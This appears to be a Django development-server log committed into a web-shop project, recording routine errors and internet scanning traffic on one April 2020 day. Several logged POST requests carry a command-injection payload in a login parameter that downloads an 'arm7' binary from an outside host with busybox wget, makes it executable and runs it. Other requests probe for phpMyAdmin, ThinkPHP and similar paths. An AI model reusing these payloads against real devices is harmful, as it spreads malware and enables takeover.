+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 01:29:25] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://192.3.45.185/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63326
+Not Found: /
+[13/Apr/2020 01:39:57] "GET / HTTP/1.1" 404 2164
+Not Found: /
+[13/Apr/2020 01:50:15] "GET / HTTP/1.1" 404 2167
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 01:57:26] "GET / HTTP/1.1" 400 59723
+Not Found: /
+[13/Apr/2020 03:05:39] "GET / HTTP/1.1" 404 2167
+Not Found: /
+[13/Apr/2020 03:54:17] "GET / HTTP/1.1" 404 2167
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 05:01:34] "GET / HTTP/1.0" 400 60175
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 07:09:00] "GET / HTTP/1.0" 400 60244
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 07:15:15] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63365
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 07:15:16] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63365
+Not Found: /phpmyadmin/scripts/setup.php
+[13/Apr/2020 07:22:04] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 2266
+Not Found: /phpmyadmin/scripts/setup.php
+[13/Apr/2020 07:32:42] "GET /phpmyadmin/scripts/setup.php HTTP/1.0" 404 2266
+Not Found: /manager/text/list
+[13/Apr/2020 07:36:52] "GET /manager/text/list HTTP/1.1" 404 2233
+Not Found: /TP/public/index.php
+[13/Apr/2020 08:51:08] "GET /TP/public/index.php HTTP/1.1" 404 2239
+Not Found: /TP/index.php
+[13/Apr/2020 08:51:10] "GET /TP/index.php HTTP/1.1" 404 2218
+Not Found: /thinkphp/html/public/index.php
+[13/Apr/2020 08:51:11] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2272
+Not Found: /html/public/index.php
+[13/Apr/2020 08:51:12] "GET /html/public/index.php HTTP/1.1" 404 2245
+Not Found: /public/index.php
+[13/Apr/2020 08:51:12] "GET /public/index.php HTTP/1.1" 404 2230
+Not Found: /TP/html/public/index.php
+[13/Apr/2020 08:51:13] "GET /TP/html/public/index.php HTTP/1.1" 404 2254
+Not Found: /elrekt.php
+[13/Apr/2020 08:51:13] "GET /elrekt.php HTTP/1.1" 404 2212
+Not Found: /index.php
+[13/Apr/2020 08:51:15] "GET /index.php HTTP/1.1" 404 2209
+Not Found: /
+[13/Apr/2020 08:51:17] "GET / HTTP/1.1" 404 2167
+Not Found: /
+[13/Apr/2020 09:02:17] "GET / HTTP/1.1" 404 2167
+----------------------------------------
+Exception happened during processing of request from ('61.219.11.153', 63958)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /TP/public/index.php
+[13/Apr/2020 09:35:20] "GET /TP/public/index.php HTTP/1.1" 404 2239
+Not Found: /TP/index.php
+[13/Apr/2020 09:35:20] "GET /TP/index.php HTTP/1.1" 404 2218
+Not Found: /thinkphp/html/public/index.php
+[13/Apr/2020 09:35:20] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 2272
+Not Found: /html/public/index.php
+[13/Apr/2020 09:35:20] "GET /html/public/index.php HTTP/1.1" 404 2245
+Not Found: /public/index.php
+[13/Apr/2020 09:35:20] "GET /public/index.php HTTP/1.1" 404 2230
+Not Found: /TP/html/public/index.php
+[13/Apr/2020 09:35:20] "GET /TP/html/public/index.php HTTP/1.1" 404 2254
+Not Found: /elrekt.php
+[13/Apr/2020 09:35:20] "GET /elrekt.php HTTP/1.1" 404 2212
+Not Found: /index.php
+[13/Apr/2020 09:35:20] "GET /index.php HTTP/1.1" 404 2209
+Not Found: /
+[13/Apr/2020 09:35:20] "GET / HTTP/1.1" 404 2167
+Not Found: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 11:49:29] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 2250
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 11:49:39] "GET / HTTP/1.0" 400 60096
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 11:53:10] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 63365
+Not Found: /
+[13/Apr/2020 12:24:10] "GET / HTTP/1.1" 404 2167
+Not Found: /cgi-bin/mainfunction.cgi
+[13/Apr/2020 15:04:15] "POST /cgi-bin/mainfunction.cgi HTTP/1.1" 404 2250
+Not Found: /
+[13/Apr/2020 16:15:49] "GET / HTTP/1.1" 404 2167
+Invalid HTTP_HOST header: 'astorun.europe-west4-a.c.trans-dynamics-267415.internal'. You may need to add 'astorun.europe-west4-a.c.trans-dynamics-267415.internal' to ALLOWED_HOSTS.
+Bad Request: /
+[13/Apr/2020 16:33:38] "GET / HTTP/1.1" 400 59724
+Not Found: /_cat/indices
+[13/Apr/2020 17:21:36] "GET /_cat/indices?bytes=b&format=json HTTP/1.1" 404 2242
+[13/Apr/2020 18:25:02] "GET /api/shop/products/category/2 HTTP/1.1" 301 0
+[13/Apr/2020 18:25:02] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/css/default.css HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/jquery-3.4.1.min.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/js/default.js HTTP/1.1" 304 0
+[13/Apr/2020 18:25:03] "GET /static/rest_framework/img/grid.png HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[13/Apr/2020 18:25:03] "GET /favicon.ico HTTP/1.1" 404 2215
+[13/Apr/2020 18:25:10] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+[13/Apr/2020 18:25:18] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1746
+[13/Apr/2020 18:25:25] "GET /api/shop/products/category/2/ HTTP/1.1" 200 13290
+[13/Apr/2020 18:25:25] "GET /static/rest_framework/css/bootstrap.min.css.map HTTP/1.1" 404 1746
+/home/dberehovets/ASTORUN_store/shop/urls.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+April 12, 2020 - 16:55:45
+Django version 3.0.5, using settings 'ASTORUN_store.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
